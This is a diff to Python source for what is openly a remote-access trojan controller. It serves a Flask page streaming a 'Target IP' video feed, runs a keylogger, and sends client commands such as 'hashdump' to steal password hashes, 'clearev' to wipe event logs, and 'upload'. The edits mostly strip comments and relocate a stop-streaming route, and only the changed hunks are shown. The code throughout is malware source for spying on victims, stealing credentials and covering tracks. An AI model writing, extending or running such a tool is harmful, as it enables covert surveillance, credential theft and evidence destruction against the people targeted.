@@ -1,11 +1,11 @@
 import socket
 import threading
 import time
-from flask import Flask, Response, render_template_string, request
+from flask import Flask, Response, render_template_string, request, redirect, url_for
 from colorama import Fore, init
 import cv2
 import numpy as np
-import keyboard  # Import the keyboard library
+import keyboard
 from datetime import datetime
 
 init(autoreset=True)
@@ -14,8 +14,8 @@ app = Flask(__name__)
 clients = {}
 server_thread = None
 streaming = False
-keylogger_data = []  # List to store keylogger data
-keylogger_running = False  # Flag to check if keylogger is running
+keylogger_data = []
+keylogger_running = False
 
 html_template = """
 <!doctype html>
@@ -25,19 +25,13 @@ html_template = """
   </head>
   <body>
     <h1>Video Streaming</h1>
-    
-    <!-- Description Section -->
     <div>
       <p><strong>Target IP :</strong> {{ target_ip }}</p>
       <p><strong>Start Time :</strong> {{ start_time }}</p>
     </div>
-    
-    <!-- Video Stream Section -->
     <div>
       <img src="{{ url_for('video_feed') }}" width="640" height="480">
     </div>
-    
-    <!-- Stop Streaming Section -->
     <div>
       <a href="{{ url_for('stop_streaming') }}">
         <button>Stop Streaming</button>
@@ -47,13 +41,11 @@ html_template = """
 </html>
 """
 
-
-
 def start_streaming(client_socket, mode, client_id):
     global streaming
     streaming = True
     target_ip = client_id.split(":")[0]
-    start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Get the current date and time 
+    start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
     print(Fore.BLUE + "[ * ] Starting streaming session...")
     time.sleep(1)
@@ -68,11 +60,17 @@ def start_streaming(client_socket, mode, client_id):
     def video_feed():
         return Response(generate_frames(client_socket, client_id),
                         mimetype='multipart/x-mixed-replace; boundary=frame')
-      
+
+    @app.route('/stop_streaming')
+    def stop_streaming():
+        global streaming
+        streaming = False
+        print(Fore.RED + "[ * ] Stopping streaming...")
+        return redirect(url_for('index'))
+
     print(Fore.BLUE + f"[ * ] Opening player at: http://localhost:5000")
     print(Fore.BLUE + "[ * ] Streaming...")
 
-    # Run the Flask app in a separate thread to handle the streaming
     threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False)).start()
 
 def generate_frames(client_socket, client_id):
@@ -97,14 +95,6 @@ def start_keylogger():
         keyboard.on_press(keylogger_callback)
         keylogger_running = True
         print(Fore.YELLOW + "[ * ] Keylogger started.")
-
-    @app.route('/stop_streaming')
-    def stop_streaming():
-    global streaming
-    streaming = False  # Stop streaming
-    print(Fore.RED + "[ * ] Stopping streaming...")
-    return redirect(url_for('index'))
-
 
 def stop_keylogger():
     global keylogger_running
@@ -146,7 +136,6 @@ def handle_client(client_socket, addr):
         print(Fore.YELLOW + f"[ * ] Command '{command}' sent to client.")
         client_socket.send(command.encode('utf-8'))
 
-        # Handle the response from the client for different commands
         if command == "hashdump":
             print(Fore.YELLOW + "[ * ] Starting...")
             response = client_socket.recv(4096).decode('utf-8', errors='ignore')
@@ -158,13 +147,12 @@ def handle_client(client_socket, addr):
             print(Fore.WHITE + response)
 
         elif command == "clearev":
-            print(Fore.YELLOW + "[ * ]  Starting......")
+            print(Fore.YELLOW + "[ * ]  Starting...")
             response = client_socket.recv(4096).decode('utf-8', errors='ignore')
             print(Fore.WHITE + response)
 
         elif command == "upload":
             print(Fore.YELLOW + "[ * ]  Starting...")
-            # In this case, we're not asking for file input, just sending the command to the client
             response = client_socket.recv(4096).decode('utf-8', errors='ignore')
             print(Fore.WHITE + response)
 
